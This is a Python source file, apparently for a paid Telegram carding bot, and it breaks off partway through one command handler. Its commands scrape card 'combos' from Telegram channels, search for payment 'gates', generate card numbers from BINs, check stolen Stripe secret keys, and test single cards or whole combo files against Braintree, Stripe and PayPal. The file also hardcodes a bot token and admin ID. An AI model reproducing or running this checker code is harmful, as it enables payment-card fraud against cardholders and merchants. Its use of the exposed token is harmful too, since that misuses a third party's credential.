#   /admin - admin control
#   /search - google scrap for gates
#   /bin - BIN lookup
#   /cb - check file bins
#   /len - how many file lines
#   /mix - shuffle and mix combo lines
#   /filter - extract cards with specific bin
#   /gef - genrate combo file
#   /gen - genrate 10 cards
#   /scr - scrap cards
#   /sk - check sk key
#   /chk - check single card with braintree
#   /str - check single card with stripe
#   /ss - check single card with stripe
#   /kk - check single card with stripe
#   /mm - check single card with stripe
#   /au - check single card with stripe
#   /pay - check single card with paypal
#   /pp - check single card with paypal
#   /ps - check single card with paypal
#   /pa - check single card with paypal
#   /pn - check single card with paypal
#   /filestr - check combo file with stripe
#   /file - check combo file with braintree
#   /filep - check combo file with paypal
#   /fss - check combo with stripe auth
#   /fkk - check combo with stripe auth
#   /fmm - check combo with stripe auth
#   /fau - check combo with stripe auth
#   /fpp-check combo with paypal charge
#   /fps - check combo with paypal charge
#   /fpa-check combo with paypal charge
#   /fpn - check combo with paypal charge
#   /start - start the bot
#———–———–———–———–———–———#
#pylint:disable=W0603
#pylint:disable=W0703
#pylint:disable=W0622
#———–———–———–———–———–———#
import telebot, time, os, asyncio, datetime, re, io, csv, uuid
from telebot import types
from datetime import datetime, timedelta
#———–———–———–———–———–———#
from braintree_Api import main as api
from bin_info_v1 import bin_info
from paypal import process_card_p
from paypal1 import processcard as pn
from paypal2 import processcard as ps
from paypal3 import processcard as pp
from paypal4 import processcard as pa
from stripe import process_card
from stripe1 import process_card as strr
from stripe2 import process_card as ss
from stripe3 import process_card as mm
from stripe4 import process_card as kk
from stripe5 import process_card as au
from braintree import process_card_b
from genfun import gen_card
from search import perform_search
from len_fun import count_lines
from mix_fun import mix_lines
from filter_fun import filter
from sk_check import check_key
from binlookup import get_bin_info
from check_bins_fun import extract_bins
from scrap_fun import get_last_messages,save_to_file
#———–———–———–———–———–———#
bot = telebot.TeleBot("5929009539:AAG18NDhJ8JzMnh-Kx64Ne0qAq3EG2OI91w", parse_mode='html')
admin_id = 5894339732

bot.send_message(admin_id,"Started")
iD = ["5894339732"]
bot_working = True
is_card_checking = False
#—–————–——–—db—––———––———#
csv_file = "databases/user_data.csv"
keys_file = "databases/keys.csv"
claimed_keys_file = "databases/claimed_keys.csv"
user_data = "databases/user_ids.csv"
user_language = {}
#—–————–——–—db—––———––———#
def is_user_allowed(user_id):
	allowed_user_ids = [str(id) for id in iD]
	return str(user_id) in allowed_user_ids
#—————–————–———————––———#
if not os.path.exists("Temps"):
	os.makedirs("Temps")
#—————–————–———————––———#
def user_has_access(user_id):
	try:
		current_time = datetime.now()
		with open(csv_file, 'r') as csvfile:
			reader = csv.reader(csvfile)
			for row in reader:
				if str(user_id) == row[0]:
					expiration_time_str = row[2]
					expiration_time = datetime.strptime(expiration_time_str, "%Y-%m-%d %H:%M:%S")
					if current_time <= expiration_time:
						return True
					else:
						return False
			return False
	except Exception as e:
		print(f"Error: {e}")
		return False
#—————–————–———————––———#
def get_level(key):
	try:
		with open(keys_file, 'r') as csvfile:
			reader = csv.reader(csvfile)
			for row in reader:
				if row and row[0] == key:
					return row[1]
		return None
	except Exception as e:
		print(f"Error: {e}")
		return None
#—————–————–———————––———#
def parse_duration(duration_str):
	days = 0
	hours = 0
	months = 0
	years = 0
	matches = re.findall(r'(\d+)([dhmy])', duration_str)
	for value, unit in matches:
		value = int(value)
		if unit == 'd':
			days += value
		elif unit == 'h':
			hours += value
		elif unit == 'm':
			months += value
		elif unit == 'y':
			years += value
	total_days = days + months * 30 + years * 365
	return timedelta(days=total_days, hours=hours)
#—————–————–———————––———#
def is_user_in_csv(user_id):
    with open(user_data, 'r') as file:
        reader = csv.reader(file)
        for row in reader:
            if row[0] == str(user_id):
                return True
    return False
#—————–————–———————––———#
def save_ids_to_csv(message):
    if not is_user_in_csv(message.chat.id):
        with open(user_data, 'a', newline='') as file:
            writer = csv.writer(file)
            writer.writerow([message.chat.id, message.chat.first_name])
            send_new_user_info_to_admin(message)
#—————–————–———————––———#
def send_new_user_info_to_admin(message):
	bot.send_message(admin_id, f"New user started the bot:\nUser ID: {message.chat.id}\nFirst Name: {message.chat.first_name}\nUsername: @{message.chat.username}")
#—————–————–———————––———#
def get_all_user_info_from_csv():
    with open(user_data, 'r') as file:
        all_users = [f"{i + 1}: {row[0]} - {row[1]}" for i, row in enumerate(csv.reader(file))]
    return all_users
#—————–————–———————––———#
def get_user_number():
    with open(user_data, 'r') as file:
        reader = csv.reader(file)
        return sum(1 for _ in reader)
#—————–————–———————––———#
@bot.message_handler(commands=['num'])
def handle_all_num(message):
    user_id = message.chat.id

    if user_id == admin_id:
        user_number = get_user_number()
        if user_number is not None:
            bot.send_message(admin_id, f"Your user number is: {user_number}")
        else:
            bot.send_message(admin_id, "You are not registered as a user.")
    else:
        bot.send_message(user_id, "You are not authorized to use this command.")
#—————–————–———————––———#
@bot.message_handler(commands=['all'])
def handle_all(message):
    user_id = message.chat.id

    if user_id == admin_id:
        all_users = get_all_user_info_from_csv()
        user_number = get_user_number()
        bot.send_message(admin_id,f"All Users: {user_number}\n"+"\n".join(all_users))
    else:
        bot.send_message(user_id, "You are not authorized to use this command.")
#—————–————–———————––———#
@bot.message_handler(commands=['key'])
def generate_key(message):
	if message.chat.id != admin_id:
		bot.reply_to(message, "Unauthorized")
		return
	try:
		parts = message.text.split()
		key = str(uuid.uuid4())
		level = "premium"
		duration_str = None
		if len(parts) >= 2:
			level = parts[1]
		if len(parts) >= 3:
			duration_str = ' '.join(parts[2:])
		if duration_str:
			try:
				expiration_time = (datetime.now() + parse_duration(duration_str)).strftime("%Y-%m-%d %H:%M:%S")
			except ValueError as e:
				bot.send_message(message.chat.id, str(e))
				return
		else:
			expiration_time = "N/A"
		with open(keys_file, 'a', newline='') as csvfile:
			writer = csv.writer(csvfile)
			writer.writerow([key, level, expiration_time])
		bot.send_message(message.chat.id, f"Key generated: `{key}`\nLevel: {level}\nExpiration: {expiration_time}", parse_mode="Markdown")
	except Exception as e:
		bot.send_message(message.chat.id, f"Error: {e}")
#—————–————–———————––———#
@bot.message_handler(commands=['claim'])
def claim_key(message):
	try:
		parts = message.text.split()
		if len(parts) < 2:
			bot.send_message(message.chat.id, "Invalid command. Use /claim key.")
			return
		key = parts[1]
		with open(claimed_keys_file, 'r') as claimed_keys:
			claimed_keys_reader = csv.reader(claimed_keys)
			for claimed_key in claimed_keys_reader:
				if key == claimed_key[0]:
					bot.send_message(message.chat.id, "Key has already been claimed.")
					return
		with open(csv_file, 'r') as data:
			data_reader = csv.reader(data)
			for row in data_reader:
				current_time = datetime.now()
				expiration_time_str = row[2]
				expiration_time = datetime.strptime(expiration_time_str, "%Y-%m-%d %H:%M:%S")
				if len(row) >= 2 and str(message.chat.id) == row[0] and current_time >= expiration_time:
					with open(csv_file, 'w') as data:
						lines = data.readlines()
						print(lines)
						for line in lines:
							if not line.startswith(message.chat.id):
								data.write(line)
				if len(row) >= 2 and str(message.chat.id) == row[0]:
					bot.reply_to(message, "You Already Have a Subscription")
					return
		with open(keys_file, 'r') as keys:
			keys_reader = csv.reader(keys)
			for row in keys_reader:
				if key == row[0]:
					expiration_time = row[2]
					with open(csv_file, 'a', newline='') as csvfile:
						writer = csv.writer(csvfile)
						writer.writerow([message.chat.id, key, expiration_time])
					with open(claimed_keys_file,'a',newline='') as claimed_keys:
						writer = csv.writer(claimed_keys)
						writer.writerow([key])
					bot.send_message(message.chat.id, "Subscription activated.")
					return
		bot.send_message(message.chat.id, "Key not found or expired.")
	except Exception as e:
		bot.send_message(message.chat.id, f"Error: {e}")
		with open(keys_file, 'r') as keys:
			keys_reader = csv.reader(keys)
			for row in keys_reader:
				if key == row[0]:
					expiration_time = row[2]
					with open(csv_file, 'a', newline='') as csvfile:
						writer = csv.writer(csvfile)
						writer.writerow([message.chat.id, key, expiration_time])
					
					with open(claimed_keys_file, 'a', newline='') as claimed_keys:
						claimed_keys_writer = csv.writer(claimed_keys)
						claimed_keys_writer.writerow([key])
					bot.send_message(message.chat.id, "Subscription activated.")
					return
		bot.send_message(message.chat.id, "Key not found or expired.")
	except Exception as e:
		bot.send_message(message.chat.id, f"Error: {e}")
#—————–————–———————––———#
@bot.message_handler(commands=['sub'])
def sub(message):
	with open(csv_file, 'r') as csvfile:
		reader = csv.reader(csvfile)
		for row in reader:
			if str(message.chat.id) == row[0]:
				level = get_level(row[1])
				expiration_time_str = row[2]
				current_time = datetime.now()
				expiration_time = datetime.strptime(expiration_time_str, "%Y-%m-%d %H:%M:%S")
				if current_time <= expiration_time:
					bot.send_message(message.chat.id, f"Telegram ID: {message.chat.id}\nSubscription: {level}\nExpiration: {expiration_time_str}")
				else:
					bot.send_message(message.chat.id, f"Telegram ID: {message.chat.id}\nSubscription: [has expired]")
				return
		bot.send_message(message.chat.id, "You have no subscription.")
#—————–————–———————––———#
def create_main_menu_keyboard(message):
	markup = types.InlineKeyboardMarkup()
	user_id = message.chat.id
	if user_id in user_language:
		language = user_language[user_id]
	else:
		language = 'en'
	admn="admin"
	combo = "Combo Helper"
	other = "Other"
	cc = "CC Check"
	scrap = "scrap"
	lang = "Language"
	if language == 'es':
		admn="administración"
		other="Otro"
		cc = "Verificación CC"
		scrap = "chatarra"
		combo = "Ayudante combinado"
		lang = "idioma"
		
	markup.add(types.InlineKeyboardButton(admn, callback_data="admin"),types.InlineKeyboardButton(other, callback_data="other"))
	
	markup.add(types.InlineKeyboardButton(cc, callback_data="cc"))

	markup.add(types.InlineKeyboardButton(scrap, callback_data="scr"))
	
	markup.add(types.InlineKeyboardButton(combo, callback_data="combo"))
	
	markup.add(types.InlineKeyboardButton(lang, callback_data="lang"))
	return markup

def create_back_button_keyboard(user_id):
	markup = types.InlineKeyboardMarkup()
	if user_id in user_language:
		language = user_language[user_id]
	else:
		language = 'en'
	back = "Back"
	if language == 'es':
		back = "Atrás"
	markup.add(types.InlineKeyboardButton(back, callback_data="back"))
	return markup
def create_lang_back_button_keyboard(user_id):
	markup = types.InlineKeyboardMarkup()
	if user_id in user_language:
		language = user_language[user_id]
	else:
		language = 'en'
	back = "Back"
	if language == 'es':
		back = "Atrás"
	markup = types.InlineKeyboardMarkup(row_width=2)
	item_en = types.InlineKeyboardButton("English", callback_data='en')
	item_es = types.InlineKeyboardButton("Spanish", callback_data='es')
	markup.add(item_en, item_es)
	markup.add(types.InlineKeyboardButton(back, callback_data="back"))
	return markup
#—————–————–———————––———#
@bot.message_handler(commands=['start'])
def send_main_menu(message):
	
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)

	user_id = message.chat.id
	if user_id in user_language:
	   language = user_language[user_id]
	else:
		language = 'en'
	caption="""
Welcome to the bot please choose from the options below.
"""
	if language == 'es':
		caption="""
Bienvenido al bot, elija entre las opciones siguientes.
"""

	bot.send_video(message.chat.id, video="https://telegra.ph/file/368c5c5b4b76cfeb4d74b.mp4",
				   caption=caption, reply_markup=create_main_menu_keyboard(message))

@bot.callback_query_handler(func=lambda call: call.data == "admin")
def admin_callback(call):
	chat_id = call.message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
		admn = "You cannot access the Admins commands because you are not an Admin."
	if language == 'es':
		admn = "No puede acceder a los comandos de administradores porque no es administrador."
		
	message_id = call.message.message_id
	admin_msg ="""
#———–———–——————–——#
#   /admin - admin control
#———–———–——————–——#
		"""
	if language == 'es':
		admin_msg ="""
#———–———–——————–——#
#   /admin - control administrativo 
#———–———–——————–——#
		"""
	if chat_id == admin_id:
		bot.edit_message_caption(admin_msg,chat_id, message_id, reply_markup=create_back_button_keyboard(chat_id))
	else:
		
		bot.answer_callback_query(call.id, text=admn, show_alert=True)

@bot.callback_query_handler(func=lambda call: call.data == "cc")
def cards_callback(call):
	chat_id = call.message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	message_id = call.message.message_id
	msg ="""
#———–———–——————–——#
/chk - check single card with braintree
/str - check single card with stripe
/pay - check single card with paypal
/file - check combo file with braintree
/filestr - check combo file with stripe
/filep - check combo file with paypal
#———–———–——————–——#
	"""
	if language == 'es':
		msg = """
#———–———–——————–——#
/chk - comprobar una sola tarjeta con Braintree 
/str - cheque tarjeta única con stripe 
/pay - consultar tarjeta única con paypal 
/file - comprobar el archivo combinado con Braintree 
/filestr - comprobar archivo combinado con stripe 
/filep - comprobar archivo combinado con paypal 
#———–———–——————–——#
		"""
	bot.edit_message_caption(msg, chat_id, message_id, reply_markup=create_back_button_keyboard(chat_id))

@bot.callback_query_handler(func=lambda call: call.data == "scr")
def scarp_callback(call):
	chat_id = call.message.chat.id
	message_id = call.message.message_id
	chat_id = call.message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """
#———–———–——————–——#
#   /scr - scrap cards
#———–———–——————–——#
"""
	if language == 'es':
		msg = """
#———–———–——————–——#
#   /scr - tarjetas de desecho 
#———–———–——————–——#
"""
	bot.edit_message_caption(msg, chat_id, message_id, reply_markup=create_back_button_keyboard(chat_id))

@bot.callback_query_handler(func=lambda call: call.data == "combo")
def combo_callback(call):
	chat_id = call.message.chat.id
	message_id = call.message.message_id
	chat_id = call.message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """
#———–———–——————–——#
#   /cb - check file bins
#   /len - how many file lines
#   /mix - shuffle combo lines
#   /filter - extract cards with specific bin
#   /gef - genrate combo file
#   /gen - genrate 10 cards
#———–———–——————–——#
"""
	if language == 'es':
		msg = """
#———–———–——————–——#
#   /cb - comprobar contenedores de archivos 
#   /len - cuantas lineas de archivo 
#   /mix - mezclar líneas combinadas 
#   /filter - extraer tarjetas con contenedor específico 
#   /gef - generar archivo combinado 
#   /gen - generar 10 tarjetas
#———–———–——————–——#
"""
	bot.edit_message_caption(msg, chat_id, message_id, reply_markup=create_back_button_keyboard(chat_id))

@bot.callback_query_handler(func=lambda call: call.data == "other")
def other_callback(call):
	chat_id = call.message.chat.id
	message_id = call.message.message_id
	chat_id = call.message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """
#———–———–——————–——#
#   /search - google scrap for gates
#   /sk - check sk key
#   /bin - BIN lookup
#———–———–——————–——#
"""
	if language == 'es':
		msg = """
#———–———–——————–——#
#   /search - chatarra de google para puertas 
#   /sk - comprobar la tecla sk 
#   /bin - búsqueda de BIN 
#———–———–——————–——#
"""
	bot.edit_message_caption(msg, chat_id, message_id, reply_markup=create_back_button_keyboard(chat_id))

@bot.callback_query_handler(func=lambda call: call.data == "lang")
def language_callback(call):
	chat_id = call.message.chat.id
	message_id = call.message.message_id
	chat_id = call.message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """Select your language:"""
	if language == 'es':
		msg = """Elige tu idioma:"""
	bot.edit_message_caption(msg, chat_id, message_id, reply_markup=create_lang_back_button_keyboard(chat_id))
	
@bot.callback_query_handler(func=lambda call: call.data in ["en", "es"])
def en_set_language(call):
	user_id = call.message.chat.id
	language = call.data

	user_language[user_id] = language

	bot.answer_callback_query(call.id, text=f"Language set to {language.capitalize()}")

@bot.callback_query_handler(func=lambda call: call.data == "back")
def back_callback(call):
	chat_id = call.message.chat.id
	message_id = call.message.message_id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """
Welcome to the bot please choose from the options below.
"""
	if language == 'es':
		msg = """
Bienvenido al bot, elija entre las opciones siguientes.
"""
	bot.edit_message_caption(msg, chat_id, message_id, reply_markup=create_main_menu_keyboard(call.message))

#—————–————–———————––———#
@bot.message_handler(commands=['admin'])#1
def admin_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if message.from_user.id == admin_id:
		keyboard = telebot.types.InlineKeyboardMarkup()
		if bot_working:
			status_text = "The bot is working ✅"
			button_text = "Set bot as not working ❌"
		else:
			status_text = "The bot is not working ❌"
			button_text = "Set bot as working ✅"
		
		keyboard.add(telebot.types.InlineKeyboardButton(text=button_text, callback_data='toggle_status'))
		bot.send_message(message.chat.id, status_text, reply_markup=keyboard)
	else:
		pass

@bot.callback_query_handler(func=lambda call: call.data == 'toggle_status')
def toggle_status_callback(call):
	global bot_working
	bot_working = not bot_working
	if bot_working:
		new_status = "The bot is working ✅"
		new_button_text = "Set bot as not working ❌"
	else:
		new_status = "The bot is not working ❌"
		new_button_text = "Set bot as working ✅"
	
	keyboard = telebot.types.InlineKeyboardMarkup()
	keyboard.add(telebot.types.InlineKeyboardButton(text=new_button_text, callback_data='toggle_status'))
	bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=new_status, reply_markup=keyboard)
#—————–————–———————––———#
@bot.message_handler(commands=['search']) #2
def search_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	chat_id = message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """
Search Started...⏳
"""
	msg1 = "Please provide three arguments in the format: \n/search [payment] [name] [domain]"
	if language == 'es':
		msg = """
Búsqueda iniciada... ⏳
"""
		msg1 = "Proporcione tres argumentos en el formato: \n/buscar [pago] [nombre] [dominio]"
	if bot_working:
		chat_id = message.chat.id
		initial_message = bot.reply_to(message, msg)
		args = message.text.split()[1:]
		if len(args) != 3:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=msg1)
			return
		
		v1, v2, v3 = args
		result = perform_search(v1, v2, v3)
		bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=result,disable_web_page_preview=True)
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['bin'])#3
def bin_lookup_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	chat_id = message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """
Lookup Started...⏳
"""
	msge = "An error occurred:"
	if language == 'es':
		msg = """
Búsqueda iniciada... ⏳
"""
		msge = "Ocurrió un error:"
	if bot_working:
		chat_id = message.chat.id
		try:
			initial_message = bot.reply_to(message, msg)
			biN = message.text.split()[1]
			bin_inf = bin_info(biN)
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=bin_inf)
		except Exception as ex:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=f"{msge} {str(ex)}")
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['cb'])#4
def handle_bins_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	chat_id = message.chat.id
	if chat_id in user_language:
	   language = user_language[chat_id]
	else:
		language = 'en'
	msg = """
Please reply to a combo file to get the bins it contains.
"""
	if language == 'es':
		msg = """
Responda a un archivo combinado para obtener los contenedores que contiene. 
"""
	if bot_working:
		try:
			bins_count = extract_bins(message, bot)
			if bins_count is not None:
				sorted_bins = sorted(bins_count.items(), key=lambda item: item[1], reverse=True)
				with io.StringIO() as file_buffer:
					writer = csv.writer(file_buffer)
					writer.writerow(["Bin", "Count"])
					for bin, count in sorted_bins:
						writer.writerow([bin, count])
					file_buffer.seek(0)
					bot.send_document(message.chat.id, file_buffer,'bins.csv')
			else:
				
				bot.reply_to(message, msg)
		except Exception as e:
			bot.reply_to(message, str(e))
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['len'])#5
def handle_len_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """'Count Started...⏳"""
		if language == 'es':
			msg = """Conteo iniciado... ⏳"""
		initial_message = bot.reply_to(message, msg)
		response = count_lines(message,bot)
		bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=response)
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['mix'])#6
def handle_mix_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Mix Started...⏳"""
		msg1 = """Please reply to a document to use this command."""
		msg2 = """An error occurred:"""
		if language == 'es':
			msg = """Mezcla iniciada...⏳"""
			msg1 = """Responda a un documento para utilizar este comando."""
			msg2 = """Ocurrió un error:"""
		try:
			if message.reply_to_message and message.reply_to_message.document:
				initial_message = bot.reply_to(message, msg)
				file_info = bot.get_file(message.reply_to_message.document.file_id)
				downloaded_file = bot.download_file(file_info.file_path)
				shuffled_content = mix_lines(downloaded_file)
				temp_file_path = os.path.join("Temps", 'shuffled_lines.txt')
				with open(temp_file_path, 'w') as shuffled_file:
					shuffled_file.write(shuffled_content)
				with open(temp_file_path, 'rb') as shuffled_file:
					bot.delete_message(message_id=initial_message.message_id,chat_id=chat_id)
					bot.send_document(message.chat.id, shuffled_file)
				os.remove(temp_file_path)
			else:
				bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=msg1)
		except Exception as e:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=f"{msg2} {str(e)}")
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['filter'])#7
def handle_filter(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Filter Started...⏳"""
		msg1 = """Invalid command format. Please use '/filter <bin_to_search>'"""
		msg2 = """Cards Found"""
		msg3 = """No lines found with that bin in the file. or you didn't reply to a file."""
		if language == 'es':
			msg = """Filtro iniciado...⏳"""
			msg1 = """Formato de comando no válido. Utilice '/filter <bin_to_search>'"""
			msg2 = """Tarjetas encontradas"""
			msg3 = """No se encontraron líneas con ese contenedor en el archivo. o no respondiste a un archivo."""
		command_parts = message.text.split()
		chat_id = message.chat.id
		initial_message = bot.reply_to(message, msg)
		if len(command_parts) != 2:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=msg1,parse_mode='None')
			return
		value = command_parts[1]
		fun_call = filter(bot, value, message)
		filtered_lines = fun_call[0]
		if filtered_lines:
			file_name = f'Temps/{value}.txt'
			with open(file_name, 'w') as output_file:
				output_file.write('\n'.join(filtered_lines))
			with open(file_name, 'rb') as file_to_send:
				bot.delete_message(message_id=initial_message.message_id,chat_id=chat_id)
				bot.send_document(message.chat.id, file_to_send, caption=f"{msg2} => {fun_call[1]}")
			os.remove(file_name)
		else:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=msg3)
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['gef'])#8
def generate_cards(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		from datetime import datetime
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Generating Started...⏳"""
		msg1 = ["Count","Took"]
		msg2 = """An error occurred:"""
		if language == 'es':
			msg = """Generando iniciado... ⏳"""
			msg1 = ["Contar","Tomó"]
			msg2 = """Ocurrió un error:"""
		try:
			initial_message = bot.reply_to(message, msg)
			start_time = datetime.now()
			command_args = message.text.split()[1:]
			a = command_args[0] if len(command_args) > 0 else ""
			e = int(command_args[1]) if len(command_args) > 1 else 50
			b = command_args[2] if len(command_args) > 2 else ""
			c = command_args[3] if len(command_args) > 3 else ""
			d = command_args[4] if len(command_args) > 4 else ""
			cards_data = ""
			f = 0
			while f < e:
				card_number, exp_m, exp_y, cvv = gen_card(a, b, c, d)
				cards_data += f"{card_number}|{exp_m}|{exp_y}|{cvv}\n"
				f += 1
			file_name = "Temps/generated_cards.txt"
			with open(file_name, "w") as file:
				file.write(cards_data)
			
			end_time = datetime.now()
			time_taken_seconds = (end_time - start_time).total_seconds()
			time_taken_formatted = "{:.2f}".format(time_taken_seconds)
			with open(file_name, "rb") as file:
				bin_inf = bin_info(a)
				bot.delete_message(message_id=initial_message.message_id,chat_id=chat_id)
				bot.send_document(message.chat.id, file, caption=f"{msg1[0]} =>> {e}\n{bin_inf}\n{msg1[1]} =>>{time_taken_formatted}")
			os.remove(file_name)
		except ValueError as ex:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=f"{msg2} {str(ex)}")
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['gen'])#9
def generate_card(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Generating Started...⏳"""
		msg2 = """An error occurred:"""
		if language == 'es':
			msg = """Generando iniciado... ⏳"""
			msg2 = """Ocurrió un error:"""
		try:
			initial_message = bot.reply_to(message,msg)
			card_info = message.text.split('/gen ', 1)[1]
			def multi_explode(delimiters, string):
				pattern = '|'.join(map(re.escape, delimiters))
				return re.split(pattern, string)
		
			split_values = multi_explode([":", "|", "⋙", " ", "/"], card_info)
			bin_value = ""
			mes_value = ""
			ano_value = ""
			cvv_value = ""
			
			if len(split_values) >= 1:
				bin_value = re.sub(r'[^0-9]', '', split_values[0])
			if len(split_values) >= 2:
				mes_value = re.sub(r'[^0-9]', '', split_values[1])
			if len(split_values) >= 3:
				ano_value = re.sub(r'[^0-9]', '', split_values[2])
			if len(split_values) >= 4:
				cvv_value = re.sub(r'[^0-9]', '', split_values[3])
			cards_data = ""
			f = 0
			while f < 10:
				card_number, exp_m, exp_y, cvv = gen_card(bin_value, mes_value, ano_value, cvv_value)
				cards_data += f"<code>{card_number}|{exp_m}|{exp_y}|{cvv}</code>\n"
				f += 1
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=cards_data)
		except Exception as e:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=f"{msg2} {e}")
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['scr'])#10
def send_last_messages(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Scarping Started...⏳"""
		msg1 = ["Count","Took","Source"]
		msg2 = """command format. Use /scr [username] [limit]"""
		if language == 'es':
			msg = """Raspado iniciado...⏳"""
			msg1 = ["Contar","Tomó","Fuente"]
			msg2 = """formato de comando. Utilice /scr [nombre de usuario] [límite]"""
		initial_message = bot.reply_to(message, msg)
		start_time = datetime.datetime.now()
		command_parts = message.text.split()
		if len(command_parts) == 3 and command_parts[0] == '/scr':
			
			username = command_parts[1]
			limit = int(command_parts[2])
			try:
				username = int(username)
			except ValueError:
				pass
			loop = asyncio.new_event_loop()
			asyncio.set_event_loop(loop)
			messages_text = loop.run_until_complete(get_last_messages(username, limit))
			save_to_file(messages_text)
			file_len = len(messages_text.split('\n'))
			end_time = datetime.datetime.now()
			time_taken_seconds = (end_time - start_time).total_seconds()
			time_taken_formatted = "{:.2f}".format(time_taken_seconds)
			captain_info = f"{msg1[0]} = {file_len}\n{msg1[1]} = {time_taken_formatted}\n{msg1[2]} = {command_parts[1]}"
			with open('combo.txt', 'rb') as file:
				bot.delete_message(message_id=initial_message.message_id,chat_id=chat_id)
				bot.send_document(message.chat.id, file,caption=captain_info)
		else:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=msg2)
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['sk'])#11
def handle_sk_message(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
		else:
			language = 'en'
		msg = """Checking Started...⏳"""
		msg1 = """Invalid command format. Please use '/sk <sk_key>'"""
		if language == 'es':
			msg = """Comprobando iniciado...⏳"""
			msg1 = """Formato de comando no válido. Utilice '/sk <sk_key>'"""
		command_parts = message.text.split()
		initial_message = bot.reply_to(message, msg)
		if len(command_parts) != 2:
			bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text= msg1,parse_mode='none')
			return
		sk = command_parts[1]
		result = check_key(sk)
		bot.edit_message_text(chat_id=chat_id, message_id=initial_message.message_id, text=result)
	else:
		pass
#—————–————–———————––———#
@bot.message_handler(commands=['chk'])#12
def brinetree_chk_command(message):
	if not user_has_access(message.chat.id):bot.reply_to(message,"The Bot is Not Free\nTo Buy: @E_2_7");return
	if not is_user_in_csv(message):
		save_ids_to_csv(message)
	if bot_working:
		chat_id = message.chat.id
		if chat_id in user_language:
		   language = user_language[chat_id]
